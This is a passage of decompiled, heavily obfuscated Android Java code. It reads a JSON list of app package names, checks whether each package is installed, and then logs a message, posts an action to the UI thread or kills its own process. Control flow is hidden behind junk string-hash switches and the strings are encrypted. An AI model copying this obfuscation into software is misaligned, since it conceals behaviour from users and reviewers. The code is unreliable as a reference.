                                                                    str36 = "ۜۥۚۥۘۘۘۜۜۨۜۙۘۗۨۘۖ۠ۡۘۧۗۡ۫ۡۦۘۦۤ۟ۜۦۨۥۜۗۧۛۦۘۡۘۘۘ۠ۘۖۧۚۜۛ۫ۘ";
                                                                case -244973524:
                                                                    String str37 = "ۜ۫ۡۗۖۚۢ۠ۜۖۛۢۚۚۚۧۡۨۗۚۙ۠ۜۨۘ۫ۥۘۗ۬ۜۗۢ۫ۚۙۘۘ";
                                                                    while (true) {
                                                                        switch (str37.hashCode() ^ 847742129) {
                                                                            case -1991609068:
                                                                                str37 = "ۙۛۗۢ۬ۖۤ۬ۜۘ۟۫ۘۘۤۢۡۙۚۘۘۨۙۜۘۖۖۤۤۡۖۘۛۙۡۘ";
                                                                            case 403702465:
                                                                                str37 = jSONArrayOptJSONArray2 != null ? "۬ۡ۟۠ۗۚۡۢۙۙۧۥۡ۠ۙۘ۟ۘۘۜ۠ۛۢۡ۠۫ۡۗۢ۟ۢۙۚ۬۫ۚۖۘ" : "ۢۦ۟ۗۧۗۧۨۡۚۦۘۙۖۡۘۥ۟ۦۘۧۥۥۘ۟ۙۚۙۡ۠ۖۨۧۙۜۧ۫ۙ۬ۡ۬۫ۖۧۥۘ";
                                                                            case 1248915687:
                                                                                str36 = "۫ۚۧۤۨۜۘۤۤۨۨۥۤۥۧۖۘ۬ۤۛ۟۬۠ۦۙۥۗۘۘ۠ۦ";
                                                                                break;
                                                                            case 1963326495:
                                                                                str36 = "ۧۡۥۘ۫ۤ۠ۦۖۡۥۨۤۧۤۤۦ۫ۥۢ۬۟۫ۢ۬۟۫ۛ۟۟۠ۘۘۧۦ۟۬۬ۜۥ۟";
                                                                                break;
                                                                        }
                                                                    }
                                                                    break;
                                                                case 1932785665:
                                                                    String str38 = "ۚۥۦۘۡۢ۟ۢۨۗۧۢۘۘۜۧۙۗۨۘۜۢۗۙۛ۬۫ۖۛ۫ۛۚ";
                                                                    while (true) {
                                                                        switch (str38.hashCode() ^ (-1501812766)) {
                                                                            case -2000369296:
                                                                                int i4 = 0;
                                                                                while (true) {
                                                                                    String str39 = "ۖۨۢۦ۬ۢۡۚۦۘ۟ۖۙۡۤ۠ۛ۬ۨ۠۟ۜۚۡ۬۫ۗۜۢۡ";
                                                                                    while (true) {
                                                                                        switch (str39.hashCode() ^ (-1640154000)) {
                                                                                            case -2038930273:
                                                                                                str39 = "ۜۥۘۘۨۚۧ۫ۖۙ۠ۖۢ۫ۦ۫ۢۖۧۖۗۥۢۜۧۥۨۡۘۛ۟ۜۘ";
                                                                                            case -344697233:
                                                                                                break;
                                                                                            case 405324402:
                                                                                                String str40 = "ۧۥۖۘۡۜ۟ۢۥۜۜۛۗۧۦۚۛۡۤ۫۟ۨۘۨۙۖۘۦ۫ۢۚۖۦۧۙۚۛۡ۟ۡۛ۫ۗ۬ۦ۬ۘۨۛۥۚ۟ۥۨ۫ۦۗ";
                                                                                                while (true) {
                                                                                                    switch (str40.hashCode() ^ 1879149896) {
                                                                                                        case -940729192:
                                                                                                            str40 = "ۗۜ۠ۡۜ۟ۚۜۘۙۨ۫۠ۚۥۘۡۚۜۘۥۥۡۘۤۦ۠ۜ۬ۨۘۨۜۦۤۚۛۨ۟ۡۤۜۘۥۨۤ";
                                                                                                        case 1296128129:
                                                                                                            str40 = i4 < jSONArrayOptJSONArray2.length() ? "ۚۢۨۜۙۘۘۨ۬۟ۙۥۤۘۦۦۗ۠ۧۚۢۛۗ۫۬ۙ۟ۤۚۖ۟ۘۗۡ۫ۘۘ۬ۡۘۘ۟۫ۤ" : "ۖۘۨۘۢۜۚۦ۫ۡۧۗ۠ۨۜۛ۫ۗۚۧۙۡ۟ۘۤۡ۟ۡۗۡۜۘ";
                                                                                                        case 1400532812:
                                                                                                            str39 = "ۛۦ۫ۦ۬ۨۖۗۦۘۙۛۙۖۛۘۘۥ۟۟ۛ۠ۛۥۜۖۗۜۜۨۜۦۘۧۚۛۨۨۘۘۚۛۡ۬۬ۡۦۗۛۥ۫ۖۘ";
                                                                                                            break;
                                                                                                        case 2104749802:
                                                                                                            str39 = "ۢ۫ۜۘۧ۟۫ۦ۠ۜۘۜ۫۠۫ۤۜۧۤۨۥۖ۬ۜۚۖ۫ۤۡۧۘۖ";
                                                                                                            break;
                                                                                                    }
                                                                                                }
                                                                                                break;
                                                                                            case 1011812640:
                                                                                                JSONObject jSONObjectOptJSONObject = jSONArrayOptJSONArray2.optJSONObject(i4);
                                                                                                String str41 = "ۧ۠ۘۧۨۧۘ۠ۛۚۙ۠ۗۙۧۧ۬ۚۥۘۤۗۦۘۥۤ۠ۡۧۢۦ۬ۥۘ۫ۢۖۘۤۗۙۚۚۙ۟۠ۦۡۧۧۛۛۢۖ۬ۧۨۖۦۘ";
                                                                                                while (true) {
                                                                                                    switch (str41.hashCode() ^ (-366249254)) {
                                                                                                        case 920582738:
                                                                                                            String str42 = "۫۫ۙۚۥۦ۟ۚۤۤۤ۟ۘۦ۟ۜ۠ۧۨۤۡۛۢۛۥۛ۠ۗ۠ۜۚۥ۠ۡۡ۟ۛۙ۬۬ۨۘ";
                                                                                                            while (true) {
                                                                                                                switch (str42.hashCode() ^ (-2053962969)) {
                                                                                                                    case -2079454088:
                                                                                                                        str41 = "ۙۚ۟ۨۤۜۘۨۚۘۘۚۡۨۘۙۘۦۙۨۥ۫ۗۧ۫۠ۙۙۛۥۘۢ۟ۗ";
                                                                                                                        break;
                                                                                                                    case 461811357:
                                                                                                                        str42 = jSONObjectOptJSONObject == null ? "ۚۡ۠۬۠۫ۜۘۘۘۜ۠ۥۘۜۘ۫ۧ۬ۤۜۨۙۤۘ۟۬۠ۜۚۥۨۚۚۜۘۜۛۖۘ" : "۬۟ۦۘۗۡۡۢۖۚ۟۬۬ۦ۬ۢ۬ۥۤ۬ۡۖۨۢ۟ۚۙۛۨۚۧ";
                                                                                                                    case 1781999536:
                                                                                                                        str41 = "۫ۢۤۤۖۦ۫ۡۖۧۡۗۨۘ۠ۗۢۤۖۧۘۥۚۘۚۧۜۤۤۨۘ";
                                                                                                                        break;
                                                                                                                    case 1851272054:
                                                                                                                        str42 = "ۧۘۛۙ۬ۖۗ۬ۦۨۖۘۘۧۦۤۧۤ۠ۛ۟ۢۧۖۨۘ۬ۗۤ۠ۗۤۤۘۖۘۦ۠ۖۘ";
                                                                                                                }
                                                                                                            }
                                                                                                            break;
                                                                                                        case 1128355092:
                                                                                                            str41 = "ۡۧۖۨۛۤۗۥۜۘۙۜۖ۫ۜ۫ۦۜۡۧ۫ۘۙۖ۫۟۫ۥۘۡۚۘ۫ۢۚۤۦۘۘ۟ۦۘۘۢۘۖۘۢۘۙۢۙۡۘۦۢۨۙۦ";
                                                                                                        case 1226612229:
                                                                                                            break;
                                                                                                        case 1530030284:
                                                                                                            String strOptString = jSONObjectOptJSONObject.optString(l2.decrypt("YKATccCi4HN+oB1/\n", "EMFwGqHFhSw=\n"));
                                                                                                            int iOptInt = jSONObjectOptJSONObject.optInt(l2.decrypt("hNIySISZ4NGZxyM=\n", "4LdGLeftv6U=\n"), 0);
                                                                                                            int iOptInt2 = jSONObjectOptJSONObject.optInt(l2.decrypt("u/tCzm9kKI2j6FM=\n", "2pg2pwAKd/k=\n"), 0);
                                                                                                            try {
                                                                                                                String strOptString2 = jSONObjectOptJSONObject.optString(l2.decrypt("JuzxSNr3aHI=\n", "UoWBF66SEAY=\n"), str8);
                                                                                                                try {
                                                                                                                    packageManager2.getPackageInfo(strOptString, 0);
                                                                                                                    z3 = true;
                                                                                                                } catch (PackageManager.NameNotFoundException e9) {
                                                                                                                    z3 = false;
                                                                                                                }
                                                                                                                String str43 = "ۛ۠ۛۤۥۗۖۖ۠ۥۚ۬ۢۧۛۡۘۗ۟ۦۘۘۚۙۗ۟ۘۨۖۡۨ۠ۦۘۧۖۥۜۤۜۥۨ۫۫ۡۡ۬ۧ۠";
                                                                                                                while (true) {
                                                                                                                    switch (str43.hashCode() ^ 674295835) {
                                                                                                                        case -252382775:
                                                                                                                            str43 = "۠ۚۨۘ۠ۗۢۜ۬ۢۗ۟ۙۢۘۢۢۨۘۨۘ۫ۨ۠ۥۘۥۨ۫ۢۤۖۘ";
                                                                                                                        case 199410411:
                                                                                                                            String str44 = "ۤ۠ۢۨ۟۟۫ۦۥۖۙۙۥۙۙ۟۟ۙ۠ۜ۟ۛۥۚۗ۫ۘۡۘۡۘۜۥۥ۫۫ۥۜۧ۠۟ۙۡۘ";
                                                                                                                            while (true) {
                                                                                                                                switch (str44.hashCode() ^ 1925096265) {
                                                                                                                                    case -1968070623:
                                                                                                                                        str43 = "ۡۛۨ۟۠۬ۛۢۢ۫۟ۢۡۤۛۦۦۤۥۥ۬۫ۘ۠ۤ۟ۢۗۚۙ";
                                                                                                                                        break;
                                                                                                                                    case -1501879950:
                                                                                                                                        str43 = "ۗۡۗۨ۬۠ۡ۠۠۠ۧۢۧۢۙۦۧۜۘۢۥ۬ۜۤۚۥۧ۟ۗۢۥۙۥۜ۟ۢ";
                                                                                                                                        break;
                                                                                                                                    case 280927251:
                                                                                                                                        str44 = iOptInt == 0 ? "ۚۙۜۗۙۜۢۖۛۘۥۥ۫ۡۨۤ۫ۖۧۦۡۘۗ۫۟۫ۚۤۛۥۧۤۙ۬۠ۗۛۛۙۗۥ۠ۖۡۙۛ۫ۥۘ" : "ۨۤۙۙۛۘۜۙۦۡ۫ۦۗۧۜ۬ۚۜۡ۫۫ۦۡۖۡۦۘۛۥۖۜ۬ۜۨۘ";
                                                                                                                                    case 556226357:
                                                                                                                                        str44 = "ۜۛۦ۫ۦۖۘۡۢۜۘ۬۬ۤۚۙۘۘۨۜۛ۫ۜۥۘۜ۬ۖ۟ۖۨۢۚۜۦ۟ۚ۫ۢ";
                                                                                                                                }
                                                                                                                            }
                                                                                                                            break;
                                                                                                                        case 469869847:
                                                                                                                            String str45 = "ۛۡۜۛ۠۠ۗۖۡۖۦ۬۟ۚۗ۬۟۟ۧۢ۠ۚ۟ۨ۬ۦۜۤ۟ۡۜ۟ۖۘۛ۟ۤۛۡۦۘۨۨۖۛ۫۬ۜۗۥۘۨۖ۠ۨ";
                                                                                                                            while (true) {
                                                                                                                                switch (str45.hashCode() ^ 278370523) {
                                                                                                                                    case -2109943890:
                                                                                                                                        str45 = "ۚ۟ۥۘ۫ۦۘۘۙۙۦۘ۠ۘ۟ۜۥۨۧۤۜۚ۫۬۫ۜ۟ۚۡۚۘۚ۫ۘۤۘ۬ۤ۬ۚۢۚۧۤ۠";
                                                                                                                                    case -1915794025:
                                                                                                                                        String str46 = "ۗ۠ۦۙۗۦۖۘۙۜۧۙ۫ۨۜۥۘ۠ۦ۟۟ۧۥۤۥۘۘۨ۠ۨ";
                                                                                                                                        while (true) {
                                                                                                                                            switch (str46.hashCode() ^ (-2103257348)) {
                                                                                                                                                case -1745329287:
                                                                                                                                                    str45 = "ۦۘۖۘۥۖۘۘۨ۬ۘۘۦۦۖۖۧۢۨۜۘۘۛۧۢۨۗۢۗۚۛۤۢۖ";
                                                                                                                                                    break;
                                                                                                                                                case -992342425:
                                                                                                                                                    str46 = !z3 ? "ۗ۟ۙۚ۟ۘۢۙۢۚۜۙۡۧ۠ۜۛۜۗۜۘۥ۫ۥۚۧۚۚۜۨۦۖ۟ۤۢۖ" : "ۨ۟ۥۧۨۘۦۜۖۘۢۜۥۘۢۢۥۤ۫ۦۘ۬ۨۡۜۜۘۘۖۙۙ۠";
                                                                                                                                                case -581055101:
                                                                                                                                                    str45 = "ۖۜۙۜۤ۟ۜۙۙۡۤۥۘۡۧ۟۫ۘۚۚ۠۟ۖۦۨۙ۟ۦۘۡۖۘ";
                                                                                                                                                    break;
                                                                                                                                                case 898360771:
                                                                                                                                                    str46 = "۫ۙۦۘ۬ۜۘۘۜۡۧۘۗۛۘۘۦ۬۠ۜۙ۫ۗۥۥۨۤۦۢۚۖۘۧۤۗۦۨۜۘۜۢۦۘ";
                                                                                                                                            }
                                                                                                                                        }
                                                                                                                                        break;
                                                                                                                                    case -510325199:
                                                                                                                                        break;
                                                                                                                                    case 963419135:
                                                                                                                                        break;
                                                                                                                                }
                                                                                                                            }
                                                                                                                            break;
                                                                                                                        case 476138848:
                                                                                                                            break;
                                                                                                                    }
                                                                                                                }
                                                                                                                String str47 = "ۘۚۡۡۧۥۘۢۜۥ۠ۙ۟ۢۚۙۡۗۜ۫ۘ۟ۘۨۧۘۙۜۧۨ۠۠ۖۘۥۘ۟ۦ۟";
                                                                                                                while (true) {
                                                                                                                    switch (str47.hashCode() ^ (-1497151584)) {
                                                                                                                        case -1235924817:
                                                                                                                            str47 = "ۘۥۜۘ۬۫ۦۘۗۙۘۘۤۗۜۘۚۜۚۗ۟ۖۘۦۡۗ۬ۥۥۢۚۤۜ۟۫ۜۖۢۦ۫ۛۨۘۙ۠ۗ";
                                                                                                                        case -731629361:
                                                                                                                            String str48 = "ۢ۟ۤۢۧۜۢ۫۫ۡۗۡ۟ۛۦۘۡۢۚۨۢۨۘۗۚۡ۫ۦۛۨۡۥۘۢۛۖۥۚۘ";
                                                                                                                            while (true) {
                                                                                                                                switch (str48.hashCode() ^ (-1295746607)) {
                                                                                                                                    case -1641347468:
                                                                                                                                        String str49 = "ۡۦ۫۠ۜۥۤۡۖ۠۫ۜۘۛ۬ۘ۫ۘ۬ۧۗۜۢ۫ۦۘ۫ۗۗۚۖ۟ۥ۬ۚ۬ۨۖۘ";
                                                                                                                                        while (true) {
                                                                                                                                            switch (str49.hashCode() ^ (-523873720)) {
                                                                                                                                                case -2055199741:
                                                                                                                                                    str49 = "ۚ۠ۛۜۙۥۘ۟ۥۦۘۖۤۜۘۤۖۨۘۙ۬ۖۜۥۚۘۜۜ۬ۖۙۙۨۦۘۘ۫ۖ۟ۦۙۘ۫۟ۛۡ۟";
                                                                                                                                                case -653552209:
                                                                                                                                                    String str50 = "ۤۤۦۘۗۨۛۦۨۡۘۥۡۖۘۘۨۗۚ۬ۦۘۥۛۡۘ۟۫ۘۘۚۡۖۘ۟۠ۥۘۧۤۘۘۥۡۗۢۖۧۘۗۧۜۘۗۥۧ۬ۙ";
                                                                                                                                                    while (true) {
                                                                                                                                                        switch (str50.hashCode() ^ (-764921635)) {
                                                                                                                                                            case -2080463608:
                                                                                                                                                                str49 = "ۘۙۖ۟ۗ۫ۨۗۜۖۖۧۘۧۛۡۦۗۛۜۨۢ۟۟ۘۘۥ۬ۨۘۦۖۨۖۢۡۢ۟ۥ۫ۤۚۤۡۨۨۙۡۙ۟۠ۤۖۘۧ۫ۨۘ";
                                                                                                                                                                break;
                                                                                                                                                            case -2039988096:
                                                                                                                                                                str49 = "ۧۙ۟ۚۘۢۨ۠۠ۚۨۥۘ۠ۦۨۘۚۨۜۘۖ۬۠ۦۜۨۧۢ۟ۘۙۦۚۧۜۘۤ۟ۜ";
                                                                                                                                                                break;
                                                                                                                                                            case 193429943:
                                                                                                                                                                str50 = "ۨۙۦۘ۫ۥۜۘۢۘۘۙ۫۫۫ۦۗۧ۬ۛ۬ۙ۟۫۟ۖۤۖ۟ۧۡ۬ۘۗۥۘ۠ۖۥۤۧ۫ۖۡ";
                                                                                                                                                            case 1642596052:
                                                                                                                                                                str50 = iOptInt2 != 2 ? "ۜ۟۟ۚۡۖۘۨۨۙۦۦ۠ۥۛۡۛ۠ۤ۠ۙ۫ۘۡۘۦ۟ۡۘۘۢۛ۟ۖۜۘ۟ۘۖۘۨۥ۠ۗ۬ۙ۫ۚ۬ۤۤ" : "ۨۘۦۘۡۘۖۘۗۤۨ۟۟ۡۘۖۧۥ۫۫ۨ۟ۦۦۨۗۙۙۚۦۘۗۤۡۘۦۤۦۦۨۚ";
                                                                                                                                                        }
                                                                                                                                                    }
                                                                                                                                                    break;
                                                                                                                                                case 1472958147:
                                                                                                                                                    String str51 = "۠۬ۘۘ۠۬ۘۘۗ۫۫ۤۖۙۛ۬ۢۦۧۧۤۢۗۖۡ۟ۙ۠ۖۘۦۥ۬۫ۜۛۢۘۜۘۤۚۡۜۘ۫";
                                                                                                                                                    while (true) {
                                                                                                                                                        switch (str51.hashCode() ^ 613239375) {
                                                                                                                                                            case -1262152726:
                                                                                                                                                                str51 = "ۡ۫۫ۛ۟ۜۨۡ۠ۙۦۥۥۤۡۤۛۛ۟ۦۚۚۥۦۢۦۗ۟ۢۛۢۜۦۚ۫ۜۘۘ۬ۘۚۡ۬۬۫۫ۚۗ۟ۥۘ۟۫ۤ";
                                                                                                                                                            case -903812165:
                                                                                                                                                                String str52 = "ۡۘۚۛۨۢۗۗۛۧۦۛۘۧ۟ۧۥۗۚۗۖۘۚۗۚۤ۬۠۠ۘۧۘۦۨ۫ۢ۟۬۠ۘۥۦۢۚۚۧۘۥۢۨۚۥۥۨ۟ۗ";
                                                                                                                                                                while (true) {
                                                                                                                                                                    switch (str52.hashCode() ^ 1734637147) {
                                                                                                                                                                        case -917124179:
                                                                                                                                                                            str51 = "ۡۖ۫ۧ۠ۗ۟ۡۛۡ۠ۖۘۢۘۘۘۢ۬ۙۖۥۧۘۘ۟ۦۘۛۖۨۘ۫۬ۖۚۙۥۗۖۘۧۙۦۘ۠ۡۧ";
                                                                                                                                                                            break;
                                                                                                                                                                        case 149097991:
                                                                                                                                                                            str52 = iOptInt2 != 3 ? "۬ۘۡۦ۬ۜۘۚۛۗۥۜۜۥۙ۬ۗۨۘۥۖۨۨۨۖ۬ۡۨۘۚۛۢۧۘۜۘۜۘۙۖ۟۠ۤۥۦۜۙۥۘۧۦۧ" : "ۜۛۨۙ۫ۗۙۛۖۘۛۥۜۚۖۡ۠۟ۥۘۥۥۙۜ۬ۡۦۤۧ۬ۙۦۘ";
                                                                                                                                                                        case 855912784:
                                                                                                                                                                            str51 = "ۤۖۨ۬ۛ۫ۘۙۛۖۦۨۘۢۛۤۙۨۨۨۘۦۘۦۡ۠ۨۧۜۘۖۘ۬";
                                                                                                                                                                            break;
                                                                                                                                                                        case 1631324281:
                                                                                                                                                                            str52 = "ۙۦۘۛۨۨۘ۬ۥۛۚۗۥۘۤۚ۟ۙۦۡۜۙۗۨ۫ۧۡۥۘۥۦ۟ۤ۫ۜۘۛۡۜۥۖۘ۫ۘ۠";
                                                                                                                                                                    }
                                                                                                                                                                }
                                                                                                                                                                break;
                                                                                                                                                            case -379474333:
                                                                                                                                                                break;
                                                                                                                                                            case -192669695:
                                                                                                                                                                k2.logToFloatingWindow(l2.decrypt("Yn+8CEOLxboMYPl3duF04mRdsQhHng==\n", "gOUc5/sE5V8=\n") + strOptString + l2.decrypt("Ho0x76Xmxn9L1zKa/vuZHUiHWrGKub5n\n", "8TG9ChlfI/g=\n"), l2.decrypt("Eo5EZwI=\n", "d/w2CHCzqew=\n"));
                                                                                                                                                                new Handler(Looper.getMainLooper()).post(new q0(3, context, strOptString2));
                                                                                                                                                                new Handler(Looper.getMainLooper()).postDelayed(new a(1), 1500L);
                                                                                                                                                                return;
                                                                                                                                                        }
                                                                                                                                                    }
                                                                                                                                                    break;
                                                                                                                                                case 1620514485:
                                                                                                                                                    k2.logToFloatingWindow(l2.decrypt("9PyUt8ks1Gia49HI/EZlMPLembfNOQ==\n", "FmY0WHGj9I0=\n") + strOptString + l2.decrypt("jNcXIKr1dnbZjRRV8egp\n", "Y2ubxRZMk/E=\n"), l2.decrypt("SYpdKVc=\n", "LPgvRiVbc5I=\n"));
                                                                                                                                                    new Handler(Looper.getMainLooper()).post(new q0(2, context, strOptString2));
                                                                                                                                                    break;
                                                                                                                                            }
                                                                                                                                        }
                                                                                                                                        break;
                                                                                                                                    case 12717118:
                                                                                                                                        str48 = "ۤۦۨۘۖۥۧۥۘۘۧۙۥۘ۠ۜۗ۫ۦۡۖ۟ۥۢۖۥۤۥۖۘۛ۫ۡۚۜۘۗۗۛۧۛۜۧۡۥۛۧۘۘ۠ۘۛ";
                                                                                                                                    case 448561815:
                                                                                                                                        k2.logToFloatingWindow(l2.decrypt("Ar6V7D+IsfhsodCTCuIAoAScmOw7nQ==\n", "4CQ1A4cHkR0=\n") + strOptString + l2.decrypt("h7D7uvGAo/fK5MjNoqnJ\n", "aAx3XUoIRVo=\n"), l2.decrypt("CJzkN3A=\n", "be6WWAL/ijU=\n"));
                                                                                                                                        Process.killProcess(Process.myPid());
                                                                                                                                        return;
                                                                                                                                    case 1024924545:
                                                                                                                                        String str53 = "ۛۡۙۖۦۚ۠۟۬ۡ۬ۦۘۚۡۥۘۥۜۡۖ۬ۨۘ۠ۥ۬ۚۤ۫ۚ۬ۜۡۡۤ۟ۛ";
                                                                                                                                        while (true) {
                                                                                                                                            switch (str53.hashCode() ^ (-1011724121)) {
                                                                                                                                                case -1671164373:
                                                                                                                                                    str48 = "ۡۗۦۘۧۡۨۙۦۗۘۧۨۙۧۖۢۡۥۗۨ۟ۥۥ۠ۙۢۦۛ۟ۤۚۜۘۡۦۡۗۘۙۥۗۢ";
                                                                                                                                                    break;
                                                                                                                                                case -1089497818:
                                                                                                                                                    str48 = "ۢۤۖۙۛۨۖۜۡۘۛ۬ۧۥۢۙۦۨۢ۠ۜۦۘۧۥۙۚ۠ۥۜۗۛۚۘۧۜۡۡۙۤۧۥۧۚۡ۠ۘۖۖۖ";
                                                                                                                                                    break;
                                                                                                                                                case -538489306:
                                                                                                                                                    str53 = "ۢۚۦۘۘۖۨۗۖۜۘۖۘۙۡ۟۟ۦۡۨۘۦۚۢۥۚۨۤۜۘۨۧۡۘ";
                                                                                                                                                case 1195570900:
                                                                                                                                                    str53 = iOptInt2 != 1 ? "ۖۤۘۗۘ۬ۡ۫ۘۙ۟ۚۚۨۖ۬ۚۖۘۖۥۥۘ۠ۤ۠ۖۢۥۘ۠ۙۛۡۢۘۘۦۤۙۙۘۗۢ۫" : "ۡۙۦۘۜ۫ۛۡۧۘۙۙ۫ۥ۫ۥ۫ۥۧۦۘ۠۟ۤۚۥ۬ۥۘۛۨۡ۫ۢۖۧۗۖۡۖۥۦۖۛ";
                                                                                                                                            }
                                                                                                                                        }
                                                                                                                                        break;
                                                                                                                                }
                                                                                                                            }
                                                                                                                            break;
                                                                                                                        case 82550948:
                                                                                                                            String str54 = "ۙۜۧۘ۬ۖۡۘۙۨ۟۟ۙۜۘۛۘۥۗۛۤۢۜۘ۬ۧۤۖۗۜۖۚۧۖۛۗۘۛۥ۫ۨۙۙۢۖۘۨۖۜۧ۠";
                                                                                                                            while (true) {
                                                                                                                                switch (str54.hashCode() ^ (-1071263208)) {
                                                                                                                                    case -1028351397:
                                                                                                                                        str47 = "۟۠ۧۦۨۨ۬۟ۗۦۚۘۧۢۖۤۢۘۧۜۦۘ۬ۥۘ۠ۗۦۜۗ۠";
                                                                                                                                        break;
                                                                                                                                    case -848225374:
                                                                                                                                        str54 = "ۙ۬ۨۘ۬ۚۢ۠ۨۧۘۛ۬۬ۧۤۙۦۙۨۘ۟ۚۨۜۜۜۘۘۙۚ۫ۡۜۘ۠۬ۗۗۖۥۢۦۜۙۢۥۥۛۗۖۨۘۚۧ۟ۗۛۥ";
                                                                                                                                    case -250171712:
                                                                                                                                        str47 = "ۜ۟ۡۘۛۦ۬۠ۢۖۘ۟ۜۤۦۤۢۗۦۘۘ۠۫ۗ۬ۥۖۘ۫ۢۡ۫۫۠ۜ۬ۨ۟ۢۦۘۥۘ۟۟ۜۛۢۚۙ۫ۙۛۖۙۘۘ۫۫ۦ";
                                                                                                                                        break;
                                                                                                                                    case 574472980:
                                                                                                                                        str54 = iOptInt2 != 0 ? "ۘۛۡۥۛ۫ۡۧۦۘۢۙۘۥ۟ۧ۠۟ۡۛۨۘۚۙۨۙۜۗ۠۠ۜۥۤۡۥۖۥ۟ۖۖ۠ۜۘۛۨۛ۠ۨۘۘ" : "ۤۡۨۨۡ۠ۨۘۦ۬ۧۡۢۘۥۦ۠ۢۦ۟ۖۘ۠ۦۧۖۧۙ۬ۗۡۡۡۦۘۜۥۢۚۢۚۤ۫۟ۛۢۧ۬ۨۖ";
                                                                                                                                }
                                                                                                                            }
                                                                                                                            break;
                                                                                                                        case 1105882750:
                                                                                                                            k2.logToFloatingWindow(l2.decrypt("IkkkvzEv/L1MVmHABEVN5SRrKb81Og==\n", "wNOEUImg3Fg=\n") + strOptString + l2.decrypt("oIIX760+Hcbt2xGo/gtGjuyN\n", "Tz6bCBa2+2s=\n"), l2.decrypt("1RqI6JY=\n", "sGj6h+TcE6Q=\n"));
                                                                                                                            a = false;
                                                                                                                            return;
                                                                                                                    }
                                                                                                                }
                                                                                                            } catch (Exception e10) {
                                                                                                                e = e10;
                                                                                                                iArr3[0] = iArr3[0] + 1;
                                                                                                                k2.logToFloatingWindow(h.d("qfKD5+uhOZjNi5G4m7hG\n", "T24pAHQE3CQ=\n", new StringBuilder(), e), l2.decrypt("vlLPCf8=\n", "2yC9Zo0+phA=\n"));
                                                                                                                str7 = str8;
                                                                                                                str2 = "ۛۨۢ۟ۥ۫ۨۗ۬ۦۖۘۖۡۨۘ۟ۖۖۥۨۨۘۦۚۘۘ۫ۤۡۘۡ۬ۦۜ۫۬ۙۧۡۘ";
                                                                                                                while (true) {
                                                                                                                    switch (str2.hashCode() ^ (-296637591)) {
                                                                                                                        case -2051262072:
                                                                                                                            break;
                                                                                                                        case -660958403:
                                                                                                                            break;
                                                                                                                        case -203741106:
                                                                                                                            break;
                                                                                                                        case 750215639:
                                                                                                                            break;
                                                                                                                    }
                                                                                                                }
                                                                                                                Thread.sleep(1000L);
                                                                                                            }
                                                                                                            break;
                                                                                                    }
                                                                                                }
                                                                                                i4++;
                                                                                                break;
                                                                                        }
                                                                                    }
                                                                                }
                                                                                break;
                                                                            case -1493740012:
                                                                                break;
                                                                            case 1314620725:
                                                                                String str55 = "ۢۖۨۘۚ۬ۥۜۥۘۘۙ۬۠ۙۧۖۘۜۨۦ۬۠ۥ۬ۢۡۘۛ۟ۨۢۙۙۖۥۥۨۛ۬۟ۦۧۘۜ۟ۤۚ۟ۨۤۢۤ۠ۗ۟ۖۤۧ";
                                                                                while (true) {
                                                                                    switch (str55.hashCode() ^ 1137777315) {
                                                                                        case -849292742:
                                                                                            str55 = "ۦ۫ۧۜۚۢۙۤ۟ۥۨۥۘ۠ۗۨۘۚۦۥۤ۠ۘ۠ۥۙۡۜۡۢۚ۬ۥۖۧۘ";
                                                                                        case -428932143:
                                                                                            str38 = "۠ۗۡۚۤۚۗ۬ۥۧۡۘۘ۫ۘۨۥۙۥۘۗ۬ۘۘۗۥۨۨۨۡۘۙۛۢۖۙۜۦ۟ۡۡ۬ۧۗۨۘۘۗۙۥۗۙۦۨۧۦۘۤ۠ۢ";
                                                                                            break;
                                                                                        case 1303627440:
                                                                                            str55 = jSONArrayOptJSONArray2.length() > 0 ? "۫ۙۚ۠ۜ۠۫ۢۚ۠ۘۜۜۤۥۨۥۦۤۦۡۘۤۢ۬ۙۦۡۘۧۨۚ۟ۗۢۧۧۚۗۤۜۧ۟۫" : "ۛۗۧۙ۫ۙۢۨ۠۟۫ۖۘۗۤۛۤۢۖۘۦۚۡۘۖۙۢ۬ۨۨۘۙ۟ۛ۟ۘۦۛۛۖۘ";
                                                                                        case 1643751259:
                                                                                            str38 = "۠ۚۨۗ۫۠ۗۚۨۘۘۘۡۘۜ۬۬۟۫ۗ۟ۗ۫ۙ۫ۡۨۛۙۙۘۧۘ۠ۨۖۥ۫ۗۚۘۖ۠ۙۡ";
                                                                                            break;
                                                                                    }
                                                                                }
                                                                                break;
                                                                            case 1459916026:
                                                                                str38 = "ۜۘۙۛۨ۠ۜۘۙۙۗۤۖ۫ۖۘۖ۠ۥۘۢۥ۬ۡۡۨۘ۠ۧ۠ۚۚۗۤۥۤۤۗ";
                                                                        }
                                                                    }
                                                                    break;
                                                                case 1969530450:
                                                                    break;
                                                            }
                                                        }
                                                        break;
                                                    case 1230724643:
                                                        String str56 = "ۚۤۥۘۢۙۥۚۡۧۛۙ۫۫ۘۘۘ۟۬ۦۘۡۧۚ۬ۨۨۘۙۛۦۧۤۤۤۢۗ۟ۜۤ۬ۤۥ۫ۖۨۧۘۡ۬۬";
                                                        while (true) {
                                                            switch (str56.hashCode() ^ 1896256285) {
                                                                case -759841180:
                                                                    str56 = zOptBoolean4 ? "ۤ۠ۜۢ۟ۡ۬ۜۗۖۤۜۜۚۜۤۦۘ۬۫۬ۜۤۨۘۥۦ۬ۖۛ۟۫ۘۘۥۢۘۘ۫ۧۥۘۥۧۨۡۚ۫ۥۗ۬" : "۟ۛ۫ۙۗۖ۠ۖۢۖۨۘۘۙۗۨ۟ۗۦۘۘ۫ۖۘۖ۬ۜۘۗۡۗۖۡۡۢۧۦۘۘۥۚ۬۟ۘۤۘ۟";
                                                                case -562887979:
                                                                    str56 = "ۡۨۧۖۘۧۤ۫ۤۦۗۘۛۥۨۢۤۦۖۖۧ۠ۦۧۘ۬ۛۖۗۤۥۘۛۤۤۢۥۦ۠۫ۤ۠۠ۜۨۜۖۘۖۤۛ";
                                                                case -441160173:
                                                                    str35 = "ۛۜۡۗۚ۫ۘۢۛۡۜۖ۬ۖۙ۬ۡۖۗۗۡۧ۠ۨۘۧۛۜۡۢۘۖ۠ۚۨۙۜۘۢۛۨۘۘۜۘۨۢۡۜۡۢ";
                                                                    break;
                                                                case 905327632:
                                                                    str35 = "ۚۢۦۖۤۜۚۡۨۘۚ۬۬ۖۛۤ۬ۡۘۥۜۡۘۢۨۛۖۛۜۙ۫ۚۡۛۛۤۧۗۢۥۦۘۙ۬ۡۥۚۙۡ۠ۖۘ";
                                                                    break;
                                                            }
                                                        }
                                                        break;
                                                }
                                            }
                                            b = jSONObject;
                                            c = jSONObject.optBoolean(l2.decrypt("Lp91BvM=\n", "SvoXc5RD758=\n"), false);
